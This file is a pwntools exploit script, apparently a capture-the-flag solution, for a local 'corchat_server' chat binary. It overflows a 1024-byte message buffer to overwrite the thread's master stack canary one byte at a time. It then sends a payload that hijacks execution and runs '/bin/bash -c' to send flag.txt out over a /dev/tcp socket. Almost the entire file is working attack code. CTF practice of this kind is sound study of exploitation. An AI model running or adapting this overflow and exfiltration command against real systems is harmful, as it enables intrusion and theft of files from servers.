from pwn import *
import socket
import time
filename="./corchat_server"
libc_name="/lib/x86_64-linux-gnu/libc.so.6"
# io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']



io = process(['./corchat_server','9999'])

s = socket.socket()
host = socket.gethostname()
port = 9999


time.sleep(1)


s.connect((host, port))
print(s.recv(1024))



bias_master_canary = 3448 # bias from start



# gdb.attach(io,"brva 0x60B2") # b recvname


def overwrite_master_canary(i):
    change_name = "_SEND_MSG"
    s.send(change_name.encode())
    s.send(b'\x01\x00')
    s.send(b'\x00\x00')
    s.send(b"a"*(1024)+p16(0)+p16(bias_master_canary+i)+b'\x00'*(5+i)) # overwrite master canary
    print(i)
    time.sleep(1)



for i in range(1,8):
    overwrite_master_canary(i)



gdb_script = """
thread 2
set scheduler-locking on
brva 0x6216
"""


# gdb.attach(io,"brva 0x60b2")
# gdb.attach(io, gdb_script)
payload_catflag = b"/bin/bash -c 'cat ./flag.txt > /dev/tcp/0.0.0.0/50123'\x00"
change_name = "_SEND_MSG"
# input("1 >")
payload = change_name.encode() + b'\x01\x00' + b'\x00\x00' +payload_catflag+b'a'*(1024-len(payload_catflag))+p16(0)+p16(bias_master_canary+2)+b'\x00'*(5+7+16) + p64(0xdeadbeef)+b'\x11'
s.send(payload)



io.interactive()



